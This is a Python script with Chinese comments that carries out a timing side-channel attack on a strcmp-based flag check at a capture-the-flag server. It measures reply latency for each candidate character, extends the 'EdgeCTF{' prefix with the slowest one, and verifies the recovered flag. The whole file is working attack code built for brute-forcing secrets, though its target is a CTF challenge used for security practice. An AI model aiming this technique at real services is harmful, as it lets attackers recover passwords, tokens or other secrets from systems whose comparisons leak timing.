#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
strcmp(flag) 时间侧信道攻击脚本
利用strcmp函数按位比较的特性，通过测量响应时间来爆破flag
"""

import socket
import time
import string
import statistics
from collections import defaultdict

def connect_to_server():
    """连接到远程服务器"""
    host = "strcmp.chall.edgesecurity.team"
    port = 1341
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        return sock
    except Exception as e:
        print(f"[-] 连接失败: {e}")
        return None

def measure_response_time(test_string, num_samples=5):
    """测量指定字符串的平均响应时间"""
    times = []
    
    for _ in range(num_samples):
        sock = connect_to_server()
        if not sock:
            continue
            
        try:
            # 获取初始响应（如果有的话）
            sock.settimeout(1)
            try:
                initial = sock.recv(4096)
            except socket.timeout:
                pass
            
            # 测量发送到接收的时间
            start_time = time.time()
            sock.send((test_string + "\n").encode('utf-8'))
            
            try:
                response = sock.recv(4096)
            except socket.timeout:
                response = b""
            
            end_time = time.time()
            times.append(end_time - start_time)
            
        except Exception as e:
            print(f"测量时出错: {e}")
        finally:
            sock.close()
        
        time.sleep(0.1)  # 避免请求过于频繁
    
    if times:
        avg_time = statistics.mean(times)
        return avg_time
    return 0

def explore_initial_behavior():
    """探索初始行为，确定基准时间"""
    print("=== 探索初始行为 ===")
    
    test_cases = [
        "",
        "a",
        "wrong",
        "X" * 10,
        "Edge",
        "EdgeCTF",
        "EdgeCTF{",
        "WrongCTF{",
        "flag{",
    ]
    
    for test in test_cases:
        avg_time = measure_response_time(test, num_samples=3)
        print(f"'{test}' -> 平均时间: {avg_time:.4f}s")

def timing_attack_bruteforce():
    """使用时间侧信道攻击逐字符爆破flag"""
    print("\n=== 开始时间侧信道攻击 ===")
    
    # 已知flag格式是EdgeCTF{random_string_here}
    known_prefix = "EdgeCTF{"
    print(f"使用已知前缀: '{known_prefix}'")
    
    # 验证已知前缀的响应时间
    print("1. 验证已知前缀的响应时间...")
    prefix_time = measure_response_time(known_prefix, num_samples=5)
    print(f"'{known_prefix}' -> {prefix_time:.4f}s")
    
    # 测试错误前缀作为对比
    wrong_prefix = "WrongCTF{"
    wrong_time = measure_response_time(wrong_prefix, num_samples=5)
    print(f"'{wrong_prefix}' -> {wrong_time:.4f}s")
    
    if prefix_time <= wrong_time:
        print("警告: 已知前缀的响应时间不比错误前缀长，可能需要调整策略")
    
    # 从已知前缀开始逐字符爆破
    current_flag = known_prefix
    # 只使用可打印字符，排除一些不太可能的字符
    charset = string.ascii_letters + string.digits + "_-!@#$%^&*()+=[]|;:,.<>?"
    
    print(f"\n2. 从 '{current_flag}' 开始逐字符爆破...")
    
    max_length = 50  # 假设flag不会超过50个字符
    
    for pos in range(len(current_flag), max_length):
        print(f"\n正在爆破位置 {pos} (当前: '{current_flag}')")
        
        char_times = {}
        
        # 测试每个可能的字符
        for char in charset:
            test_string = current_flag + char
            avg_time = measure_response_time(test_string, num_samples=3)
            char_times[char] = avg_time
            print(f"  '{char}' -> {avg_time:.4f}s", end="\r")
        
        # 找出响应时间最长的字符
        best_char = max(char_times.keys(), key=lambda x: char_times[x])
        best_time = char_times[best_char]
        
        # 显示前几个最佳候选
        sorted_chars = sorted(char_times.items(), key=lambda x: x[1], reverse=True)
        print(f"\n  前3个候选:")
        for i, (char, time_val) in enumerate(sorted_chars[:3]):
            print(f"    {i+1}. '{char}' -> {time_val:.4f}s")
        
        # 添加最佳字符到当前flag
        current_flag += best_char
        print(f"  选择: '{best_char}' -> 当前flag: '{current_flag}'")
        
        # 如果遇到}可能是flag结束
        if best_char == '}':
            print(f"\n发现可能的完整flag: {current_flag}")
            break
        
        # 检查时间是否显著下降（可能已经超出了正确的部分）
        if pos > len(known_prefix) + 5:  # 在前缀之后至少尝试几个字符
            recent_times = list(char_times.values())
            avg_time_this_round = statistics.mean(recent_times)
            if best_time < avg_time_this_round * 0.8:
                print("警告: 响应时间显著下降，可能已偏离正确路径")
    
    return current_flag

def verify_flag(flag):
    """验证找到的flag"""
    print(f"\n=== 验证flag: {flag} ===")
    
    # 测试完整flag的响应时间
    full_time = measure_response_time(flag, num_samples=10)
    
    # 测试稍微修改的版本作为对比
    wrong_flag = flag[:-1] + "X"
    wrong_time = measure_response_time(wrong_flag, num_samples=10)
    
    print(f"正确flag '{flag}': {full_time:.4f}s")
    print(f"错误flag '{wrong_flag}': {wrong_time:.4f}s")
    
    if full_time > wrong_time:
        print("✅ 验证通过！找到的flag可能是正确的")
    else:
        print("❌ 验证失败，可能需要重新分析")

if __name__ == "__main__":
    print("strcmp(flag) 时间侧信道攻击")
    print("=" * 50)
    
    # 探索初始行为
    explore_initial_behavior()
    
    # 执行时间侧信道攻击
    found_flag = timing_attack_bruteforce()
    
    # 验证结果
    if found_flag:
        verify_flag(found_flag)
    
    print(f"\n最终结果: {found_flag}")